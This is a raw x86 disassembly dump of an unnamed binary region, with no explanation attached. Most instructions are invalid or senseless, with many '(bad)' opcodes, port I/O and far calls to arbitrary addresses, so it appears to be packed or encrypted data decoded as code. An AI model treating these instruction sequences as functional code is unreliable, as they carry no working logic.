  40eab5:	xchg   ecx,eax
  40eab6:	je     0x40eb1d
  40eab8:	les    ecx,FWORD PTR [ebx]
  40eaba:	or     BYTE PTR [ecx-0x2],dl
  40eabd:	call   DWORD PTR cs:[esi-0xe]
  40eac1:	rol    BYTE PTR [ebx],0xe9
  40eac4:	addr16 xchg ebx,ebp
  40eac7:	push   0xfffffff9
  40eac9:	mov    dl,BYTE PTR [esi-0x2d]
  40eacc:	cmp    ah,BYTE PTR [esi]
  40eace:	ds ss cs or al,ch
  40ead3:	mov    ecx,0x70fe9326
	...
  40eaec:	cs xchg esp,eax
  40eaee:	mov    bl,ah
  40eaf0:	mov    esp,0xbae940da
  40eaf5:	sar    edi,1
  40eaf7:	xchg   esp,eax
  40eaf8:	adc    eax,0x9d006d28
  40eafd:	cmp    eax,0x39285700
  40eb02:	sub    BYTE PTR [eax],al
  40eb04:	rol    BYTE PTR [edi],1
  40eb06:	shl    BYTE PTR [edx+edi*2-0x1d],0xe7
  40eb0b:	fiadd  WORD PTR [eax]
  40eb0d:	ins    DWORD PTR es:[edi],dx
  40eb0e:	std    
  40eb0f:	or     edx,eax
  40eb11:	add    ah,BYTE PTR [eax]
  40eb13:	mov    DWORD PTR [ebp+0x74],ecx
  40eb16:	data16 add BYTE PTR [eax+0x4e68bc5b],ah
  40eb1d:	rol    DWORD PTR [eax+0x0],cl
  40eb20:	mov    DWORD PTR [ecx],0x43dfff8
  40eb26:	call   0xfdae16f3
  40eb2b:	dec    DWORD PTR [ebp+0x74]
  40eb2e:	out    0xf1,al
  40eb30:	cs ins DWORD PTR es:[edi],dx
  40eb32:	std    
  40eb33:	cld    
  40eb34:	cmp    DWORD PTR [esi+0x6bc7ffb7],0xfffffffd
  40eb3b:	repnz out 0xb6,al
  40eb3e:	add    eax,0x736bf975
  40eb43:	cld    
  40eb44:	mov    DWORD PTR [ecx],0xd04ee808
  40eb4a:	(bad)  
  40eb4b:	push   edi
  40eb4d:	mov    al,0x4
	...
  40eb64:	adc    bl,ah
  40eb66:	mov    ch,ah
  40eb68:	xchg   ebx,eax
  40eb69:	push   ecx
  40eb6a:	loop   0x40ebc3
  40eb6c:	cli    
  40eb6d:	std    
  40eb6e:	imul   edi,DWORD PTR [edi],0xe8080277
  40eb74:	js     0x40eb46
  40eb76:	(bad)  
  40eb77:	call   FWORD PTR [ecx-0x1a74042e]
  40eb7d:	jnp    0x40eba5
  40eb7f:	inc    ecx
  40eb80:	loopne 0x40ebff
  40eb82:	cmp    eax,0x67d4cc00
  40eb87:	jnp    0x40ebc2
  40eb89:	fs inc ecx
  40eb8b:	add    BYTE PTR [esi-0x1],ch
  40eb8e:	aas    
  40eb8f:	sub    DWORD PTR [ecx],edi
  40eb91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb92:	pop    es
  40eb93:	ror    BYTE PTR [ebp-0x53],0x2b
  40eb97:	call   0xfed472f3
  40eb9c:	inc    edx
  40eb9d:	out    0xe,eax
  40eb9f:	and    al,al
  40eba1:	in     al,0x8b
  40eba3:	cmp    DWORD PTR [bx-0x425f],esp
  40eba8:	adc    DWORD PTR [ebx],esp
  40ebaa:	dec    ecx
  40ebab:	inc    ecx
  40ebac:	cmp    edx,eax
  40ebae:	sbb    al,bh
  40ebb0:	mov    ss,esp
  40ebb2:	sti    
  40ebb3:	out    0xe9,eax
  40ebb5:	cmp    eax,0xd47efe93
  40ebba:	mov    esp,edi
  40ebbc:	lock call 0xb6aeea54
  40ebc2:	ret    0x66b8
  40ebc5:	jb     0x40eb59
  40ebc7:	inc    BYTE PTR [eax]
	...
  40ebd9:	add    BYTE PTR [eax],al
  40ebdb:	add    BYTE PTR [ebx+0x39],ch
  40ebde:	int3   
  40ebdf:	push   es
  40ebe0:	int3   
  40ebe1:	das    
  40ebe2:	sbb    al,0x0
  40ebe4:	cmp    DWORD PTR [edx+0x51],ebp
  40ebe7:	addr16 mov ebp,0xd10044dc
  40ebed:	imul   ecx,DWORD PTR [eax+0x41],0x39
  40ebf1:	and    bl,BYTE PTR [ecx]
  40ebf3:	or     BYTE PTR [ecx],ah
  40ebf5:	test   eax,0xad26ff0d
  40ebfa:	add    ch,BYTE PTR [eax-0x54]
  40ebfd:	arpl   WORD PTR [ebx+0x0],ax
  40ec00:	mov    eax,ds:0x3941486f
  40ec05:	cmp    bl,cl
  40ec07:	je     0x40ec59
  40ec09:	push   0x7064e802
  40ec0e:	xchg   ecx,eax
  40ec0f:	inc    al
  40ec11:	pop    ebx
  40ec12:	sahf   
  40ec13:	imul   edi,DWORD PTR [ecx],0x7d6d9100
  40ec19:	aas    
  40ec1a:	jmp    0xa87b8d3a
  40ec1f:	add    edx,esi
  40ec21:	retf   0xdc93
  40ec24:	jns    0x40ec26
  40ec26:	adc    edi,ecx
  40ec28:	popa   
  40ec29:	xchg   ecx,eax
  40ec2a:	std    
  40ec2b:	jl     0x40eca2
  40ec2d:	mov    WORD PTR [edx-0x5ca5defd],es
  40ec33:	inc    esp
  40ec34:	cmp    DWORD PTR [eax],ebp
  40ec36:	mov    eax,ds:0xddfff848
  40ec3b:	fsub   DWORD PTR ds:0x427e7
	...
  40ec51:	add    BYTE PTR [eax],al
  40ec53:	add    BYTE PTR [ecx-0x706cd022],ah
  40ec59:	xchg   BYTE PTR [ebx],ch
  40ec5b:	xchg   esp,eax
  40ec5c:	mov    ch,0x3a
  40ec5e:	lds    esi,FWORD PTR [ebx]
  40ec60:	adc    DWORD PTR [ecx+0x2b],esp
  40ec63:	inc    ebp
  40ec64:	cmp    DWORD PTR [eax],ebp
  40ec66:	jno    0x40ecb0
  40ec68:	clc    
  40ec69:	jmp    DWORD PTR [ebp+0x27e6edd8]
  40ec6f:	add    al,0x51
  40ec71:	cli    
  40ec72:	das    
  40ec73:	xchg   ebx,eax
  40ec74:	push   edi
  40ec75:	xchg   BYTE PTR [ebx],ah
  40ec77:	pushf  
  40ec78:	mov    ebx,0xcd037d12
  40ec7d:	inc    edi
  40ec7e:	push   0x10
  40ec80:	dec    ecx
  40ec81:	(bad)  
  40ec82:	cld    
  40ec83:	inc    ebp
  40ec84:	mov    edx,0xa5037d0d
  40ec89:	int3   
  40ec8a:	rol    BYTE PTR [ecx+edi*1],1
  40ec8d:	lahf   
  40ec8e:	sahf   
  40ec8f:	xchg   edx,eax
  40ec90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec91:	clc    
  40ec92:	inc    eax
  40ec93:	aaa    
  40ec94:	imul   ecx,DWORD PTR [edi-0x6b7a6db3],0x45
  40ec9b:	sbb    BYTE PTR [ecx],dh
  40ec9d:	cwde   
  40ec9e:	xchg   ecx,eax
  40ec9f:	xor    eax,0x35ff8ffe
  40eca4:	push   ecx
  40eca5:	nop
  40eca6:	(bad)  
  40eca7:	mov    ah,0xf2
  40eca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecaa:	lahf   
  40ecab:	mov    ebx,0x94fe8ecb
  40ecb0:	mov    esi,0xb2e1748e
  40ecb5:	je     0x40ed08
  40ecb7:	push   cs
	...
  40eccc:	stos   DWORD PTR es:[edi],eax
  40eccd:	mov    ?,WORD PTR [ebp+ecx*1-0x55]
  40ecd1:	adc    al,0xe8
  40ecd3:	(bad)  
  40ecd4:	es clc 
  40ecd6:	out    0x92,eax
  40ecd8:	ins    BYTE PTR es:[edi],dx
  40ecd9:	(bad)  
  40ecda:	(bad)  
  40ecdb:	out    dx,al
  40ecdc:	inc    esi
  40ecdd:	pushf  
  40ecde:	out    0x7d,eax
  40ece0:	outs   dx,BYTE PTR ds:[esi]
  40ece1:	(bad)  
  40ece2:	(bad)  
  40ece3:	fiadd  WORD PTR [esi-0x6c]
  40ece6:	out    0x65,eax
  40ece8:	dec    esi
  40ece9:	(bad)  
  40ecea:	dec    dh
  40ecec:	es nop
  40ecee:	out    0x6d,eax
  40ecf0:	dec    esi
  40ecf1:	(bad)  
  40ecf2:	(bad)  
  40ecf3:	mov    esi,0x35e79826
  40ecf8:	cs (bad) 
  40ecfa:	(bad)  
  40ecfb:	scas   al,BYTE PTR es:[edi]
  40ecfc:	inc    esi
  40ecfd:	mov    esi,?
  40ecff:	sbb    al,0x65
  40ed01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed02:	out    dx,al
  40ed03:	cmp    ecx,eax
  40ed05:	mov    ds,WORD PTR [esi-0x60]
  40ed08:	jg     0x40ed0d
  40ed0a:	add    BYTE PTR [esp+ecx*8],dh
  40ed0d:	call   0x1300:0x19a9ad82
  40ed14:	cmc    
  40ed15:	mov    ?,WORD PTR [ecx+eiz*8-0x2e]
  40ed19:	jo     0x40ed6c
  40ed1b:	outs   dx,BYTE PTR ds:[esi]
  40ed1c:	enter  0x4477,0x65
  40ed20:	inc    edi
  40ed21:	add    BYTE PTR [edx-0x17],ch
  40ed24:	inc    edx
  40ed25:	pushf  
  40ed26:	inc    esp
  40ed27:	test   al,0x3a
  40ed29:	sbb    BYTE PTR [eax],al
  40ed2b:	jmp    0x1286d6a
	...
  40ed44:	(bad)  
  40ed46:	(bad)  
  40ed47:	dec    DWORD PTR [ebx]
  40ed49:	ret    
  40ed4a:	jb     0x40ed6f
  40ed4c:	shr    BYTE PTR [edx+0x1],1
  40ed4f:	pop    edi
  40ed50:	pop    ds
  40ed51:	jno    0x40ed5c
  40ed53:	rol    ah,0x99
  40ed56:	dec    esi
  40ed57:	push   0xbeef02d0
  40ed5c:	mov    eax,0xe0414357
  40ed61:	sar    dh,cl
  40ed63:	jne    0x40ed2d
  40ed65:	push   0xffffffef
  40ed67:	jns    0x40ed28
  40ed69:	outs   dx,DWORD PTR ds:[esi]
  40ed6a:	out    0x1d,al
  40ed6c:	aad    0x6f
  40ed6e:	std    
  40ed6f:	jmp    DWORD PTR ds:0xa875fd7f
  40ed75:	push   0xffffff8e
  40ed77:	push   edx
  40ed78:	jg     0x40ede9
  40ed7a:	mov    edx,0x8b5502a4
  40ed80:	int3   
  40ed81:	add    edx,0xfffffffc
  40ed84:	daa    
  40ed85:	out    dx,al
  40ed86:	jmp    FWORD PTR [ecx+0x51]
  40ed89:	jno    0x40edfe
  40ed8b:	or     BYTE PTR [eax-0x4d],bh
  40ed8e:	push   eax
  40ed8f:	call   FWORD PTR [edi-0x1403bbf7]
  40ed95:	mov    ebp,0x411288c
  40ed9a:	cmp    BYTE PTR [edi],0x60
  40ed9d:	idiv   BYTE PTR [edi]
  40ed9f:	push   0x41385a
  40eda4:	daa    
  40eda5:	ins    BYTE PTR es:[edi],dx
  40eda6:	jl     0x40edcf
	...
  40edbc:	push   eax
  40edbd:	add    cl,BYTE PTR [ebx]
  40edbf:	shl    BYTE PTR [eiz*4-0x307e17ab],0xfe
  40edc7:	jmp    FWORD PTR [ebx]
  40edc9:	ret    0x1972
  40edcc:	loopne 0x40edb7
  40edce:	(bad)  
  40edcf:	(bad)  
  40edd0:	cmp    DWORD PTR [esi+0x51],eax
  40edd3:	sub    DWORD PTR [di+0x41],esp
  40edd7:	add    BYTE PTR [ecx+0x46],ch
  40edda:	push   ss
  40eddb:	or     BYTE PTR [ecx],dl
  40eddd:	pop    ds
  40edde:	or     bh,bh
  40ede0:	idiv   BYTE PTR [edi]
  40ede2:	dec    esp
  40ede3:	push   ebx
  40ede4:	out    dx,al
  40ede5:	fimul  WORD PTR [esi-0x6fdf06ce]
  40edeb:	(bad)  
  40edec:	fsubp  st(6),st
  40edee:	xchg   esp,eax
  40edef:	lods   eax,DWORD PTR ds:[esi]
  40edf0:	adc    DWORD PTR [esi+0x74cec015],ebx
  40edf6:	mov    ?,esi
  40edf8:	dec    esp
  40edf9:	(bad)  
  40edfa:	call   0x805e:0x8e8e6b1f
  40ee01:	fld    DWORD PTR [esi]
  40ee03:	add    BYTE PTR [edx+eiz*1],al
  40ee06:	lahf   
  40ee07:	cmp    BYTE PTR [ebp-0x5d],0x36
  40ee0b:	push   0x39
  40ee0d:	xor    DWORD PTR [edx-0x1],eax
  40ee10:	or     al,0x9f
  40ee12:	call   0xfc88:0x8ebde8c1
  40ee19:	ret    0x3c7a
  40ee1c:	scas   eax,DWORD PTR es:[edi]
  40ee1d:	out    dx,eax
  40ee1e:	inc    esp
	...
  40ee33:	add    BYTE PTR [ecx-0x68bfd6a],bh
  40ee39:	ds in  al,0x45
  40ee3c:	clc    
  40ee3d:	xchg   esi,eax
  40ee3e:	xor    eax,0x2c62ce8
  40ee43:	add    BYTE PTR [edx+0x57],al
  40ee46:	pop    ss
  40ee47:	and    esp,esi
  40ee49:	jle    0x40ee1e
  40ee4b:	pop    ebp
  40ee4c:	inc    esi
  40ee4d:	xchg   dl,bh
  40ee4f:	mov    edi,0x68329fc5
  40ee54:	cmp    DWORD PTR [edi-0x395e4263],edx
  40ee5a:	inc    esp
  40ee5b:	inc    ecx
  40ee5c:	cmp    DWORD PTR [eax],eax
  40ee5e:	mov    ecx,0x50f8a58e
  40ee63:	out    dx,al
  40ee64:	xchg   ecx,eax
  40ee65:	lea    edx,[ebp-0x64]
  40ee68:	xor    BYTE PTR [esi+ecx*2],0x8f
  40ee6c:	add    dl,cl
  40ee6e:	sub    BYTE PTR [ebp-0x1],cl
  40ee71:	mov    WORD PTR ds:0xf05de88f,?
  40ee77:	push   es
  40ee78:	fs rol dl,0xe2
  40ee7c:	fiadd  WORD PTR [ebx-0x7207140]
  40ee82:	sub    BYTE PTR [eax],bl
  40ee84:	sbb    eax,0x7845d818
  40ee89:	add    BYTE PTR [ecx+0x628219b],bh
  40ee8f:	(bad)  
  40ee90:	outs   dx,BYTE PTR ds:[esi]
  40ee91:	sbb    cl,ch
  40ee93:	add    esp,DWORD PTR [esi+0xe6804d]
	...
  40eea9:	add    BYTE PTR [eax],al
  40eeab:	add    ah,dh
  40eead:	ds jmp 0xf15394e6
  40eeb3:	fwait
  40eeb4:	cdq    
  40eeb5:	pop    es
  40eeb6:	fimul  WORD PTR [esi-0x70c30562]
  40eebc:	(bad)  
  40eebd:	sbb    DWORD PTR [edx],ecx
  40eebf:	pushf  
  40eec0:	in     eax,dx
  40eec1:	daa    
  40eec2:	(bad)  
  40eec3:	mov    ?,WORD PTR [ebx]
  40eec5:	shl    BYTE PTR [eax+ebp*8],0xde
  40eec9:	(bad)  
  40eeca:	cs inc ebp
  40eecc:	cmp    DWORD PTR [eax],esi
  40eece:	rcr    DWORD PTR [ecx+0x33a58d0f],0xd1
  40eed5:	(bad)  
  40eed6:	call   0xce588379
  40eedb:	inc    ebp
  40eedc:	clc    
  40eedd:	(bad)  
  40eede:	cmp    BYTE PTR [edi+0x5190f7cd],cl
  40eee4:	(bad)  
  40eee5:	mov    WORD PTR [ebp-0x65],?
  40eee8:	adc    al,0x30
  40eeea:	add    BYTE PTR [esi-0x41],dh
  40eeed:	mov    dh,BYTE PTR [ebp+ebp*2-0x49]
  40eef1:	adc    al,0x8
  40eef3:	push   ecx
  40eef4:	gs xor edi,edi
  40eef7:	pop    esi
  40eef8:	addr16 mov ecx,0x353aedc1
  40eefe:	mov    edi,DWORD PTR ds:0x74efbfbb
  40ef04:	jno    0x40ee96
  40ef06:	dec    edi
  40ef07:	ds push ecx
  40ef09:	cld    
  40ef0a:	out    0x9e,eax
  40ef0c:	sbb    eax,0xe2fe8b
	...
  40ef21:	add    BYTE PTR [eax],al
  40ef23:	add    dl,bh
  40ef25:	rdmsr  
  40ef27:	push   0x49
  40ef29:	mov    WORD PTR [ecx],es
  40ef2b:	xchg   edi,eax
  40ef2c:	(bad)  [esi+0x44]
  40ef2f:	adc    DWORD PTR [ecx+eax*4],edx
  40ef32:	aaa    
  40ef33:	mov    ebp,0x61914d8
  40ef38:	and    eax,esi
  40ef3a:	(bad)  
  40ef3b:	je     0x40eeef
  40ef3d:	mov    ds:0x8abf9925,eax
  40ef42:	(bad)  
  40ef43:	je     0x40eefb
  40ef45:	mov    dh,BYTE PTR [ecx+eiz*8-0x54]
  40ef49:	adc    al,0x8
  40ef4b:	rcl    DWORD PTR [edi+0x30],1
  40ef4e:	call   esi
  40ef50:	push   cs
  40ef51:	inc    esp
  40ef52:	lock cmp DWORD PTR [ebp-0x5339a7ac],esp
  40ef59:	mov    eax,0x353aedc1
  40ef5e:	mov    eax,ebp
  40ef60:	mov    eax,0x3d43f7bf
  40ef65:	push   ss
  40ef66:	inc    ebx
  40ef67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef68:	inc    esi
  40ef69:	clc    
  40ef6a:	out    0x51,eax
  40ef6c:	or     eax,0xf660fe8b
  40ef71:	mov    ebp,DWORD PTR [ecx-0x17]
  40ef74:	and    BYTE PTR [eax],al
  40ef76:	push   0x41420f00
  40ef7b:	add    BYTE PTR [eax-0x2],cl
  40ef7e:	(bad)  
  40ef7f:	jmp    DWORD PTR [eax-0x68a98f94]
  40ef85:	jge    0x40ef90
  40ef87:	rol    BYTE PTR [eax],0x0
	...
  40ef9a:	add    BYTE PTR [eax],al
  40ef9c:	cld    
  40ef9d:	mov    ebx,0xec984587
  40efa2:	xchg   edx,eax
  40efa3:	inc    esi
  40efa4:	loope  0x40efa4
  40efa6:	(bad)  
  40efa7:	jne    0x40f011
  40efa9:	ins    BYTE PTR es:[edi],dx
  40efaa:	loopne 0x40efd1
  40efac:	adc    bh,bh
  40efae:	or     al,al
  40efb0:	lods   al,BYTE PTR ds:[esi]
  40efb1:	lahf   
  40efb2:	std    
  40efb3:	jne    0x40efdd
  40efb5:	ins    BYTE PTR es:[edi],dx
  40efb6:	add    DWORD PTR [ebp+0x17],ebx
  40efb9:	jge    0x40f009
  40efbb:	push   0x3eb832
  40efc0:	test   al,0xfe
  40efc2:	(bad)  
  40efc3:	out    dx,al
  40efc4:	data16 out 0xff,al
  40efc7:	dec    edi
  40efc8:	aaa    
  40efc9:	repz pop es
  40efcb:	call   0x3fe458
  40efd0:	dec    eax
  40efd1:	popf   
  40efd2:	push   ecx
  40efd3:	jmp    DWORD PTR [edi+0x38f8737b]
  40efd9:	xchg   ebp,eax
  40efda:	push   ecx
  40efdb:	call   DWORD PTR [edi+0x77fc737b]
  40efe1:	icebp  
  40efe2:	pop    es
  40efe3:	call   0x3fbf02
  40efe8:	fld    st(0)
  40efea:	add    al,BYTE PTR [eax]
  40efec:	sbb    eax,0x9c83eb09
  40eff1:	jp     0x40f05b
  40eff3:	add    dl,bh
  40eff5:	aaa    
  40eff6:	push   DWORD PTR [ebp+0x58]
  40eff9:	data16 sub al,0x50
  40effc:	xchg   edi,eax
  40effd:	jnp    0x40ef86
  40efff:	inc    ebp
	...
  40f014:	mov    ah,0xe6
  40f016:	(bad)  
  40f017:	(bad)  
  40f018:	cmp    DWORD PTR [edx-0x1d6098b4],eax
  40f01e:	inc    edx
  40f01f:	add    cl,dl
  40f021:	sbb    eax,0xa394145
  40f026:	push   ss
  40f027:	or     BYTE PTR [ecx],ah
  40f029:	or     dl,BYTE PTR [edi+edi*8]
  40f02c:	sbb    edx,DWORD PTR es:[esi]
  40f02f:	cld    
  40f030:	push   ds
  40f031:	lods   eax,DWORD PTR ds:[esi]
  40f032:	cli    
  40f033:	out    0x86,eax
  40f035:	inc    edi
  40f036:	mov    edi,esi
  40f038:	add    dh,dl
  40f03a:	push   es
  40f03b:	add    BYTE PTR [esi+ebx*1-0x61],ch
  40f03f:	xor    ch,0x3f
  40f042:	sbb    eax,DWORD PTR [eax]
  40f044:	cmp    DWORD PTR [edx],edi
  40f046:	dec    ebp
  40f047:	(bad)  
  40f048:	fs lahf 
  40f04a:	call   0x64fe:0x8bda7642
  40f051:	xchg   ebx,eax
  40f052:	mov    esi,DWORD PTR [ecx+eax*2-0x11]
  40f056:	push   0x8bf2ce4e
  40f05b:	je     0x40f086
  40f05d:	cli    
  40f05e:	adc    eax,0x3c12d108
  40f063:	push   DWORD PTR [esi-0x51e7eb76]
  40f069:	or     al,0xf7
  40f06b:	(bad)  
  40f06c:	sub    al,0x9f
  40f06e:	call   0x9c67:0x8aa1ee54
  40f075:	loope  0x40f0bb
	...
  40f08b:	add    BYTE PTR [esi+0x5ce7f42c],cl
  40f091:	add    al,0x4
  40f093:	add    BYTE PTR [edx],dh
  40f095:	push   edi
  40f096:	adc    BYTE PTR [ebp-0x1f],ah
  40f099:	rol    DWORD PTR [ecx+0x41],0x39
  40f09d:	mov    edi,0x9739230a
  40f0a2:	jnp    0x40f0e8
  40f0a4:	popa   
  40f0a5:	add    BYTE PTR [ecx],dl
  40f0a7:	mov    ds:0x8ae93efc,eax
  40f0ac:	(bad)
  40f0af:	add    ebx,DWORD PTR [eax+eax*1]
  40f0b2:	jmp    0xef556fb5
  40f0b7:	push   es
  40f0b8:	jl     0x40f042
  40f0ba:	outs   dx,DWORD PTR ds:[esi]
  40f0bb:	inc    ecx
  40f0bc:	dec    ecx
  40f0bd:	mov    ebx,edi
  40f0bf:	repz push ds
  40f0c1:	imul   eax,DWORD PTR [ecx],0xffffff8b
  40f0c4:	pop    ds
  40f0c5:	jge    0x40f127
  40f0c7:	mov    ecx,DWORD PTR [edx+0xd416fd4]
  40f0cd:	sbb    al,ch
  40f0cf:	add    edx,DWORD PTR [esi]
  40f0d1:	dec    edx
  40f0d2:	dec    ebp
  40f0d3:	adc    DWORD PTR [ecx],esi
  40f0d5:	cwde   
  40f0d6:	xor    edi,DWORD PTR [edx]
  40f0d8:	test   BYTE PTR [eax-0x76c2eec3],0xbb
  40f0df:	sti    
  40f0e0:	fsubrp st(3),st
  40f0e2:	popf   
  40f0e3:	mov    bl,bh
  40f0e5:	mov    BYTE PTR [ebx-0xeed2879],bl
  40f0eb:	fwait
  40f0ec:	xchg   DWORD PTR [ecx],edi
  40f0ee:	push   ss
  40f0ef:	mov    eax,DWORD PTR [eax]
	...
  40f101:	add    BYTE PTR [eax],al
  40f103:	add    bh,al
  40f105:	adc    dh,cl
  40f107:	mov    al,BYTE PTR [ebp-0xc]
  40f10a:	add    eax,0x1d984111
  40f10f:	cmp    ch,BYTE PTR [esi+0x4ac61f88]
  40f115:	add    BYTE PTR [esi+edi*2-0x7453836e],dl
  40f11c:	in     al,dx
  40f11d:	jl     0x40f13a
  40f11f:	mov    ds:0x3e93f5c,eax
  40f124:	or     eax,0x9bc86a0c
  40f129:	fldenv [edi]
  40f12b:	add    al,0x39
  40f12d:	adc    al,0x3a
  40f12f:	xchg   DWORD PTR ds:0xfc000031,ebp
  40f135:	(bad)  
  40f136:	push   DWORD PTR [edi+edi*1]
  40f139:	rol    DWORD PTR [ebp+eiz*4+0x3a],0x0
  40f13e:	add    cl,ch
  40f140:	jnp    0x40f185
  40f142:	clc    
  40f143:	jmp    0x5c40f182
  40f148:	stc    
  40f149:	mov    ecx,DWORD PTR [edi+0x74]
  40f14c:	jns    0x40f0d6
  40f14e:	dec    edi
  40f14f:	adc    esi,DWORD PTR ds:0x7c2fb018
  40f155:	add    bh,bh
  40f157:	aam    0xd7
  40f159:	aad    0x40
  40f15b:	jmp    0xaab43977
  40f160:	mov    bh,0x4
  40f162:	clc    
  40f163:	jmp    0xccc3b69e
	...
  40f17c:	mov    dh,0x87
  40f17e:	jb     0x40f17e
  40f180:	ja     0x40f18e
  40f182:	cld    
  40f183:	push   edx
  40f184:	loopne 0x40f1b3
  40f186:	mov    edi,edi
  40f188:	mov    bl,0xd
  40f18a:	sbb    BYTE PTR [esi],ch
  40f18c:	dec    eax
  40f18d:	in     al,0xfe
  40f18f:	lahf   
  40f190:	rol    BYTE PTR [esi+0xcc3d975],cl
  40f196:	or     BYTE PTR [ecx],al
  40f198:	nop
  40f199:	test   esi,edi
  40f19b:	push   cs
  40f19c:	adc    BYTE PTR [edi-0x4240feb4],al
  40f1a2:	add    ebp,DWORD PTR [edx+0x41]
  40f1a5:	mov    bh,bh
  40f1a7:	jl     0x40f1e2
  40f1a9:	cmp    DWORD PTR ds:0xfeaf49e9,0x5c
  40f1b0:	rol    DWORD PTR [esi+0x4073c614],0x0
  40f1b7:	aaa    
  40f1b8:	ret    0x3c1
  40f1bb:	jmp    0x12c6d0f
  40f1c0:	jecxz  0x40f181
  40f1c2:	repnz push ebx
  40f1c4:	xchg   edi,eax
  40f1c5:	(bad)  
  40f1c6:	test   DWORD PTR [eax],0xc7000350
  40f1cc:	adc    eax,0x60fffe70
  40f1d1:	add    edi,edi
  40f1d3:	jne    0x40f225
  40f1d5:	or     BYTE PTR [esp+edi*8-0x7f],al
  40f1d9:	out    dx,eax
  40f1da:	sti    
  40f1db:	push   0x50
  40f1dd:	in     eax,0xff
  40f1df:	imul   eax,DWORD PTR [eax],0x0
	...
  40f1f1:	add    BYTE PTR [eax],al
  40f1f3:	add    BYTE PTR [eax],ah
  40f1f5:	in     eax,0xff
  40f1f7:	(bad)  
  40f1f8:	and    eax,0x1c75fd7f
  40f1fd:	in     eax,0xff
  40f1ff:	imul   edx,DWORD PTR [eax],0x2022ca6b
  40f205:	add    ecx,DWORD PTR [ebx]
  40f207:	shl    ah,0xb5
  40f20a:	dec    esi
  40f20b:	push   eax
  40f20c:	js     0x40f1ec
  40f20e:	push   eax
  40f20f:	jmp    FWORD PTR [edi+0xb]
  40f212:	inc    esp
  40f213:	clc    
  40f214:	cdq    
  40f215:	in     al,0xff
  40f217:	imul   esp,eax,0x2875fed1
  40f21d:	jns    0x40f292
  40f21f:	cld    
  40f220:	maskmovq mm1,(bad)
  40f221:	test   DWORD PTR [ebx],0xffe4e06a
  40f227:	out    0x76,eax
  40f229:	sahf   
  40f22a:	(bad)  
  40f22b:	(bad)  
  40f22c:	fcmovnb st,st(2)
  40f22e:	jae    0x40f23f
  40f230:	das    
  40f231:	div    edi
  40f233:	call   0x3fc3bc
  40f238:	push   edi
  40f239:	(bad)  
  40f23a:	test   DWORD PTR [eax],0x83000290
  40f240:	or     eax,0x4e73fe7b
  40f245:	jns    0x40f2ba
  40f247:	or     BYTE PTR [edi-0xb],ch
  40f24a:	imul   eax
  40f24c:	cmp    DWORD PTR [ecx-0x5e81001d],eax
  40f252:	ret    0x3673
  40f255:	jmp    0x4166e2
	...
  40f26a:	add    BYTE PTR [eax],al
  40f26c:	inc    ecx
  40f26d:	mov    cl,0x3
  40f26f:	and    bh,BYTE PTR [ecx]
  40f271:	cdq    
  40f272:	sub    DWORD PTR [ebx],eax
  40f274:	js     0x40f297
  40f276:	stos   DWORD PTR es:[edi],eax
  40f277:	jmp    0xbcc4:0xccb1923
  40f27e:	sar    bh,0x46
  40f281:	leave  
  40f282:	fwait
  40f283:	in     eax,dx
  40f284:	sbb    BYTE PTR [ecx-0x7c06f4fe],bl
  40f28a:	in     eax,dx
  40f28b:	dec    edi
  40f28c:	mov    DWORD PTR [edi-0x70],ebp
  40f28f:	dec    edi
  40f290:	es (bad) 
  40f293:	inc    esp
  40f294:	and    eax,0x8cff32f1
  40f299:	and    esi,DWORD PTR [eax+ebp*8]
  40f29c:	cs dec eax
  40f29e:	xchg   esi,edi
  40f2a0:	adc    dl,BYTE PTR [esi-0x68be7fbe]
  40f2a6:	or     eax,0x8a44f6d1
  40f2ab:	out    0xf8,eax
  40f2ad:	addr16 xchg esi,edi
  40f2b0:	mov    dl,0x54
  40f2b2:	mov    ds,WORD PTR [edx-0x10]
  40f2b5:	fdecstp 
  40f2b7:	jmp    FWORD PTR [ebp+0x12]
  40f2ba:	xchg   edi,eax
  40f2bb:	xor    ch,0xcb
  40f2be:	xor    BYTE PTR [edi-0x46],dl
  40f2c1:	lods   al,BYTE PTR ds:[esi]
  40f2c2:	das    
  40f2c3:	sub    DWORD PTR [eax-0x69],edi
  40f2c6:	add    dh,BYTE PTR [ebp+0x3f]
  40f2c9:	pop    esi
  40f2ca:	sub    cl,cl
  40f2cc:	jnp    0x40f261
  40f2ce:	add    cl,BYTE PTR [ebp+0x0]
	...
  40f2e4:	cld    
  40f2e5:	xchg   BYTE PTR [ecx],dh
  40f2e7:	jmp    DWORD PTR [ebx+eiz*4]
  40f2ea:	call   0x4387:0xe5ffef30
  40f2f1:	shr    ch,0x7f
  40f2f4:	push   ebp
  40f2f5:	(bad)  
  40f2f6:	call   0xcd44aafe
  40f2fb:	add    al,0x39
  40f2fd:	lock call 0xe82eaef9
  40f303:	add    edi,DWORD PTR [ecx]
  40f305:	test   DWORD PTR [ebx],edi
  40f307:	mov    BYTE PTR [edi+0xb],bl
  40f30a:	mov    cl,0x9c
  40f30c:	xchg   edx,eax
  40f30d:	daa    
  40f30e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f30f:	xchg   DWORD PTR [ebx-0x40],eax
  40f312:	in     eax,dx
  40f313:	cmp    BYTE PTR [edx],0xff
  40f316:	call   0x8d4c311e
  40f31b:	xchg   DWORD PTR [ebp+0x74bd1088],ebp
  40f321:	aas    
  40f322:	jmp    0x75c6fec2
  40f327:	xchg   DWORD PTR [ecx-0x727882c6],esi
  40f32d:	test   BYTE PTR [ebp+0x11],ah
  40f330:	adc    DWORD PTR [eax],ebx
  40f332:	mov    ds:0x4100783e,eax
  40f337:	(bad)  
  40f338:	cld    
  40f339:	test   BYTE PTR [ebp+0x7d],cl
  40f33c:	jge    0x40f2d6
  40f33e:	inc    ebp
  40f33f:	adc    ebp,ebp
  40f341:	test   BYTE PTR [ebx-0x5154a175],dh
  40f347:	inc    esp
	...
  40f35c:	cmp    DWORD PTR [eax-0x7b287985],ebx
  40f362:	outs   dx,DWORD PTR ds:[esi]
  40f363:	inc    ecx
  40f364:	aad    0x80
  40f366:	fwait
  40f367:	xchg   edi,eax
  40f368:	(bad)  
  40f369:	cmc    
  40f36a:	ins    BYTE PTR es:[edi],dx
  40f36b:	pop    ebp
  40f36c:	mov    esi,0x3582e884
  40f371:	cwde   
  40f372:	call   0xe8a5ae6d
